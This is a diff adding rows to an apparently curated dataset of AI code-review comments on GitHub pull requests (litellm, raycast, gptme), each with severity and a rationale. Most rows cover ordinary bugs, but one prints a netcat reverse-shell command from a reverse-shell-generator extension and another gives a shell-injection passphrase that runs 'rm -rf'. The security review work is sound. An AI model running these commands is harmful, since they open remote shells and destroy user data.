@@ -18600,3 +18600,119 @@ The same defensive guard that `validate_skill()` applies — `if not isinstance(
                             d for d in raw_depends if isinstance(d, str) and d.strip()
                         ]
 ```",https://github.com/gptme/gptme/pull/1722#discussion_r2969523338,"✅ Fixed in 347ef3915: added `elif not isinstance(raw_depends, list): raw_depends = []` guard. Any non-string, non-list scalar (int, float, null, etc.) is now coerced to an empty list before the comprehension. Regression test `test_parse_lesson_non_iterable_depends_does_not_crash` added.",2026-03-21T12:20:33.345000,Non-iterable scalar `depends` value crashes parse_lesson with TypeError,runtime,high,8,"This catches a real runtime crash where `depends: 42` in a SKILL.md file causes a TypeError when iterating over the non-list value. The bug would cause parse_lesson to fail with an unhandled exception on malformed user input, affecting production reliability.",2026-03-21T14:13:24.173871+00:00
+berriai/litellm,24274,[Feature] UI - MCP: Team member permissions drawer and CRUD access,https://github.com/BerriAI/litellm/pull/24274,"<a href=""#""><img alt=""P1"" src=""https://greptile-static-assets.s3.amazonaws.com/badges/p1.svg?v=7"" align=""top""></a> **Unknown permissions duplicated on save**
+
+`selected` is seeded from ALL of `member.extra_permissions` (including permissions not present in `availablePermissions`). When saving, `existingUnknown` is built from the same source and then both are concatenated — causing any ""unknown"" permission to appear **twice** in the final payload.
+
+Concrete example:
+- `member.extra_permissions = ['mcp:read', 'custom_perm']`
+- `availablePermissions` only contains `mcp:read`
+- `existingUnknown = ['custom_perm']` (from member.extra_permissions)
+- `selected = new Set(['mcp:read', 'custom_perm'])` (initialized here)
+- `extra_permissions = [...existingUnknown, ...selected] = ['custom_perm', 'mcp:read', 'custom_perm']` ← duplicate
+
+Fix: seed `selected` with only **known** permissions so that `existingUnknown` and `selected` are disjoint:
+
+```suggestion
+  useEffect(() => {
+    if (open && member) {
+      const knownValues = new Set(availablePermissions.map((p) => p.value));
+      setSelected(new Set((member.extra_permissions || []).filter((p) => knownValues.has(p))));
+    }
+  }, [open, member, availablePermissions]);
+```
+
+And update `initial` consistently:
+```typescript
+const initial = useMemo(
+  () => {
+    const knownValues = new Set(availablePermissions.map((p) => p.value));
+    return new Set((member?.extra_permissions || []).filter((p) => knownValues.has(p)));
+  },
+  [member, availablePermissions],
+);
+```",https://github.com/BerriAI/litellm/pull/24274#discussion_r2969268428,,2026-03-21T07:27:05.572000,Unknown permissions duplicated on save due to incorrect state initialization,data_integrity,high,8,"This catch identifies a concrete data corruption bug where unknown permissions would be duplicated in the final payload. The comment provides a clear concrete example showing how 'custom_perm' would appear twice, and offers a specific fix. This is a real logic bug that would cause incorrect data to be saved.",2026-03-21T16:13:12.498867+00:00
+raycast/extensions,26528,Add reverse-shell-generator extension,https://github.com/raycast/extensions/pull/26528,"<a href=""#""><img alt=""P0"" src=""https://greptile-static-assets.s3.amazonaws.com/badges/p0.svg?v=7"" align=""top""></a> **Corrupted `sqlite3-nc` template causes runtime crash**
+
+The `sqlite3-nc` object has two `command` properties (the second — a Haskell `runhaskell` snippet — silently overwrites the first) **and** is missing all required `ShellTemplate` fields: `description`, `category`, `subcategory`, and `os`.
+
+Because `os` is `undefined`, every code path that touches this entry will throw at runtime:
+- `filteredCommands.filter(cmd => cmd.os.includes(...))` → `TypeError: Cannot read properties of undefined`
+- `cmd.os.map(os => ...)` in the list item accessories → same crash
+
+The entire commands list will be broken for all users.
+
+It looks like a botched merge left a copy of the Haskell `runhaskell` command pasted as a second `command` inside the `sqlite3-nc` block. The fix is to restore the correct SQLite3 command and supply the missing fields:
+
+```
+  {
+    type: ""sqlite3-nc"",
+    name: ""SQLite3 nc"",
+    icon: ""🗃️"",
+    command: ""sqlite3 :memory: -cmd '.shell nc {IP} {PORT} -e /bin/sh'"",
+    description: ""SQLite3 reverse shell via netcat"",
+    category: ""reverse"",
+    subcategory: ""Shell Tools"",
+    os: [""linux""],
+    listener: `nc -lvnp {PORT}`,
+  },
+```
+
+<details><summary>Prompt To Fix With AI</summary>
+
+`````markdown
+This is a comment left during a code review.
+Path: extensions/reverse-shell-generator/src/generate-reverse-shell.tsx
+Line: 229-237
+
+Comment:
+**Corrupted `sqlite3-nc` template causes runtime crash**
+
+The `sqlite3-nc` object has two `command` properties (the second — a Haskell `runhaskell` snippet — silently overwrites the first) **and** is missing all required `ShellTemplate` fields: `description`, `category`, `subcategory`, and `os`.
+
+Because `os` is `undefined`, every code path that touches this entry will throw at runtime:
+- `filteredCommands.filter(cmd => cmd.os.includes(...))` → `TypeError: Cannot read properties of undefined`
+- `cmd.os.map(os => ...)` in the list item accessories → same crash
+
+The entire commands list will be broken for all users.
+
+It looks like a botched merge left a copy of the Haskell `runhaskell` command pasted as a second `command` inside the `sqlite3-nc` block. The fix is to restore the correct SQLite3 command and supply the missing fields:
+
+```
+  {
+    type: ""sqlite3-nc"",
+    name: ""SQLite3 nc"",
+    icon: ""🗃️"",
+    command: ""sqlite3 :memory: -cmd '.shell nc {IP} {PORT} -e /bin/sh'"",
+    description: ""SQLite3 reverse shell via netcat"",
+    category: ""reverse"",
+    subcategory: ""Shell Tools"",
+    os: [""linux""],
+    listener: `nc -lvnp {PORT}`,
+  },
+```
+
+How can I resolve this? If you propose a fix, please make it concise.
+`````
+</details>",https://github.com/raycast/extensions/pull/26528#discussion_r2969617762,,2026-03-21T13:56:37.335000,Corrupted template with missing required fields causes runtime crash,runtime,high,8,"The sqlite3-nc template has a duplicate command property and is missing required fields (description, category, subcategory, os). Since os is undefined, any code path that accesses cmd.os.includes() or cmd.os.map() will throw a TypeError, breaking the entire extension for all users.",2026-03-21T16:13:12.498867+00:00
+raycast/extensions,26391,Add key-generator extension,https://github.com/raycast/extensions/pull/26391,"<a href=""#""><img alt=""P0"" src=""https://greptile-static-assets.s3.amazonaws.com/badges/p0.svg?v=7"" align=""top""></a> **Shell injection via user-controlled passphrase**
+
+The passphrase entered by the user is directly interpolated into a shell command string passed to `exec()`. A passphrase like `valid"" && rm -rf ~/important_dir && echo ""` would cause arbitrary shell command execution. Since `exec()` runs the string through `/bin/sh`, any shell metacharacters in the passphrase or file path are interpreted.
+
+Use `execFile` with arguments passed as an array, which bypasses the shell entirely:
+
+```suggestion
+            const { execFile } = await import(""child_process"");
+            // -P """" specifies that the current passphrase is empty
+            execFile(
+                ""ssh-keygen"",
+                [""-p"", ""-f"", props.issue.filePath, ""-P"", """", ""-N"", values.passphrase],
+                (error) => {
+```",https://github.com/raycast/extensions/pull/26391#discussion_r2944280541,fixed in latest commit,2026-03-17T04:25:30.168000,Shell injection via user-controlled passphrase allows arbitrary command execution,security,critical,9,"This is a critical shell injection vulnerability where user-supplied passphrase input is directly interpolated into a shell command string passed to exec(). An attacker could execute arbitrary commands by entering a malicious passphrase like `valid"" && rm -rf ~ && echo ""`. This is a severe security flaw with direct exploitation potential.",2026-03-21T16:13:12.498867+00:00
+berriai/litellm,24266,[Feature] MCP team management + per-member granular permissions,https://github.com/BerriAI/litellm/pull/24266,"<a href=""#""><img alt=""P1"" src=""https://greptile-static-assets.s3.amazonaws.com/badges/p1.svg?v=7"" align=""top""></a> **Team cache not invalidated after `add_mcp_server_to_team`**
+
+After `add_mcp_server_to_team` writes to the DB, the team object in the `user_api_key_cache` remains stale. On the very next request to delete or update the newly created server, `get_team_object` returns the cached team, which still shows either `object_permission_id = None` (if the permission row was just created) or an outdated `mcp_servers` list. Either way `_get_team_allowed_mcp_servers` returns a set that doesn't include the new server, so the `server_id not in team_servers` check raises 403 — meaning team admins can create a server but cannot delete or update it until the cache naturally expires.
+
+The same problem affects `remove_mcp_server_from_team`: the stale cache will still list the deleted server as belonging to the team.
+
+Both helpers should invalidate the team cache (and the `object_permission` cache) after their DB writes. The same pattern was already added for `team_member_update` at `team_endpoints.py:2483` and should be applied consistently in `object_permission_utils.py` after each transaction completes.",https://github.com/BerriAI/litellm/pull/24266#discussion_r2969136684,,2026-03-21T05:36:17.798000,Cache invalidation missing causes immediate 403 on newly created servers,concurrency,high,8,This identifies a real bug where team admins can create MCP servers but immediately cannot delete or update them due to stale cache returning outdated team data. This is a significant functionality bug that would affect users in production.,2026-03-21T16:13:12.498867+00:00
